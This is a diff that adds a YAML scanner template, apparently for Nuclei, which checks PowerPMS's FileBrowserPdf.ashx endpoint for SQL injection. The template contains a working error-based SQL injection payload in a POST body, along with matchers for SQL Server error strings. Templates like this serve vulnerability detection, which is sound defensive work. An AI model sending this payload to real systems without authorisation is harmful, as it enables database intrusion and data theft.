@@ -1,0 +1,39 @@
+id: poc-yaml-powerpms-filebrowserpdf-ashx-sqli
+info:
+  name: PowerPMS FileBrowserPdf.ashx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Potential SQL Injection vulnerability in PowerPMS FileBrowserPdf.ashx.
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/PowerPlat/Control/FileBrowserPdf.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "_fileid=1'+and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"success\":"
+          - "PowerPMDB/SqlServer"
+          - "0x{{t2}}"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
